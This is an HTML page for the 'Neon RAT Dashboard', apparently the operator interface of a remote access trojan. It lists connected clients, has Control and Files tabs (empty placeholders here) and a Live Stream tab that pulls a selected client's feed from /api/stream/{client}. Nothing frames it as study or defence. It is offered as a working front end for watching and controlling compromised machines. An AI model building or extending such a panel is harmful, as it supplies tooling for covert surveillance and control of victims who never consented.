<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neon RAT Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            margin: 0;
            background: linear-gradient(135deg, #1f1c2c, #928dab);
            color: #fff;
        }
        .container {
            display: flex;
            height: 100vh;
        }
        .sidebar {
            width: 250px;
            background: rgba(0, 0, 0, 0.5);
            padding: 20px;
            backdrop-filter: blur(8px);
            border-right: 2px solid #4ff9ff;
        }
        .sidebar h2 {
            color: #4ff9ff;
            border-bottom: 2px solid #4ff9ff;
            padding-bottom: 10px;
        }
        .main {
            flex: 1;
            padding: 30px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(4px);
            overflow-y: auto;
        }
        h1 {
            font-size: 2em;
            color: #f6f6f6;
            margin-bottom: 20px;
        }
        .tab-buttons {
            margin-bottom: 20px;
        }
        .tab-btn {
            background: transparent;
            color: #fff;
            border: 2px solid #4ff9ff;
            padding: 10px 20px;
            margin-right: 10px;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        .tab-btn.active,
        .tab-btn:hover {
            background: #4ff9ff;
            color: #000;
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
            animation: fadeIn 0.4s ease-in;
        }
        @keyframes fadeIn {
            from {opacity: 0;}
            to {opacity: 1;}
        }
        .panel {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #4ff9ff;
            border-radius: 10px;
            padding: 20px;
        }
        .panel h3 {
            color: #4ff9ff;
            margin-bottom: 15px;
        }
        #stream-display {
            width: 100%;
            height: auto;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(79, 249, 255, 0.6);
            margin-bottom: 15px;
            background: #000;
        }
        .stream-controls {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        .stream-controls button {
            background: #4ff9ff;
            border: none;
            color: #000;
            padding: 10px 15px;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        .stream-controls button:hover {
            background: #34d6d6;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Sidebar -->
        <div class="sidebar">
            <h2>Connected Clients</h2>
            <div id="client-list"></div>
        </div>

        <!-- Main Content -->
        <div class="main">
            <h1>Neon RAT Dashboard</h1>
            <div class="tab-buttons">
                <button class="tab-btn active" onclick="openTab('control')">Control</button>
                <button class="tab-btn" onclick="openTab('files')">Files</button>
                <button class="tab-btn" onclick="openTab('stream')">Live Stream</button>
            </div>

            <!-- Control Tab -->
            <div id="control" class="tab-content active">
                <!-- Previous content -->
            </div>

            <!-- Files Tab -->
            <div id="files" class="tab-content">
                <!-- Previous content -->
            </div>

            <!-- New Stream Tab -->
            <div id="stream" class="tab-content">
                <div class="panel">
                    <h3>Live Stream</h3>
                    <img id="stream-display" src="" alt="Live Stream">
                    <div class="stream-controls">
                        <button onclick="startStream()">Start Stream</button>
                        <button onclick="stopStream()">Stop Stream</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Tab management
        function openTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.style.display = 'none';
            });
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            document.getElementById(tabName).style.display = 'block';
            event.currentTarget.classList.add('active');
        }

        // Stream functionality
        let streamInterval;
        function startStream() {
            if (!selectedClient) return alert('Select a client first!');
            const streamDisplay = document.getElementById('stream-display');
            streamDisplay.src = `/api/stream/${selectedClient}`;
        }

        function stopStream() {
            const streamDisplay = document.getElementById('stream-display');
            streamDisplay.src = '';
        }

        // Placeholder for client update (assumes updateClients is defined elsewhere)
        function updateClients() {
            // Simulated function
        }

        let selectedClient = null; // Placeholder for client selection logic

        // Initialize
        updateClients();
    </script>
</body>
</html>
